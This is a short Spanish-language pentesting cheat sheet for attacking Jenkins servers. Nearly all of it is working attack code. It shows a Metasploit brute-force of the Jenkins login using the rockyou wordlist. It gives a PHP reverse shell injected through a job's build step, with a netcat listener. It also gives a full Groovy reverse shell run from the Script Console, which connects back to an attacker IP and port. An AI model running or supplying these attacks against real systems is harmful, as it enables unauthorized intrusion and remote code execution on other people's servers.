## Brute Force a login

```bash
msfconsole

use scanner/http/jenkins_login

set RHOSTS <IP>
set USERNAME admin
set PASS_FILE ../rockyou.txt

run
```

## Rev Shell desde un Job

```bash
https://domain/user/my-views/view/all/job/admin/configure
```

En build steps: 

```php
php -r '$sock=fsockopen("<IP>",<PORT>);shell_exec("sh <&3 >&3 2>&3");'
```

Apply y Save

Mientras esta nc en escucha 

Click en Build Now 

## Rev shell desde la script console

Manage Jenkins → Script Console

```bash
String host="<IP>";
int port=<PORT>;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Y recibo poniendome en escucha:

```bash
nc -lnvp <PORT>
```
